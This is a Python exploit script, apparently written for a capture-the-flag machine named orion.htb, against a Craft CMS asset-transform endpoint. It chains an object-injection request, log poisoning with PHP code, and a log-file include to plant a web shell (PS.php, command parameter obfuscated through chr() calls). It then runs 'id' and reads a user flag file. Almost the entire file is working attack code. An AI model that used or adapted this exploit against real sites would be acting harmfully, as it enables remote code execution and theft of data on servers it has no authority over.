import requests, re, json, time, sys

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def do_step1():
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        raise RuntimeError(f'No CSRF token. Resp: {r.text[:300]}')
    csrf = m.group(1)
    print(f'CSRF: {csrf[:30]}...', flush=True)

    shell_file = '/var/www/html/craft/web/PS.php'
    # Build PHP inject code with single quotes to avoid interpolation
    inner_code = '<?php system($_GET[chr(99).chr(109).chr(100)]); ?>'
    php_code = ("<?php file_put_contents('" + shell_file + "', '" + inner_code + "'); ?>")
    inject_path = '/nonexistent_dir/' + php_code

    body = {
        'assetId': 11,
        'handle': {
            'width': 1, 'height': 1,
            'as session': {
                'class': 'yii\\rbac\\PhpManager',
                'itemFile': inject_path
            }
        }
    }
    headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=30)
    print(f'Step1 POST: {r2.status_code}, {len(r2.text)} bytes', flush=True)
    for kw in ['require', 'Failed opening', '<?php', 'file_put_contents']:
        if kw in r2.text:
            idx = r2.text.index(kw)
            print(f'  [{kw}] at {idx}: {r2.text[idx:idx+100]}')
    return r2

def do_step2():
    time.sleep(3)
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        raise RuntimeError(f'No CSRF token. Resp: {r.text[:300]}')
    csrf = m.group(1)

    error_log = '/var/www/html/craft/storage/logs/phperrors.log'
    body = {
        'assetId': 11,
        'handle': {
            'width': 1, 'height': 1,
            'as session': {
                'class': 'yii\\rbac\\PhpManager',
                'itemFile': error_log
            }
        }
    }
    headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=30)
    print(f'Step2 POST: {r2.status_code}, {len(r2.text)} bytes', flush=True)
    for kw in ['<?php', 'file_put_contents', 'PS.php', 'nonexistent', 'require(']:
        if kw in r2.text:
            idx = r2.text.index(kw)
            print(f'  [{kw}] at {idx}: {r2.text[idx:idx+80]}')
    return r2

def do_step3():
    time.sleep(2)
    r = requests.get(f'{HOST}/PS.php?cmd=id', headers=HEADERS, timeout=10)
    print(f'Step3 /PS.php: {r.status_code}', flush=True)
    if r.status_code == 200:
        print(f'  [+] SHELL OUTPUT: {r.text[:1000]}')
        # Read flag
        r2 = requests.get(f'{HOST}/PS.php?cmd=cat /home/adam/user.txt', headers=HEADERS, timeout=10)
        if r2.status_code == 200:
            print(f'  [+] USER FLAG: {r2.text[:200]}')
        return True
    else:
        print(f'  {r.text[:200]}')
        return False

if __name__ == '__main__':
    print('Step 1: Inject PHP code into error_log', flush=True)
    r1 = do_step1()

    print('\nStep 2: Include error_log', flush=True)
    r2 = do_step2()

    print('\nStep 3: Check for shell', flush=True)
    success = do_step3()
    if success:
        print('\n[+] EXPLOIT SUCCEEDED!')
    else:
        print('\n[-] Exploit failed')
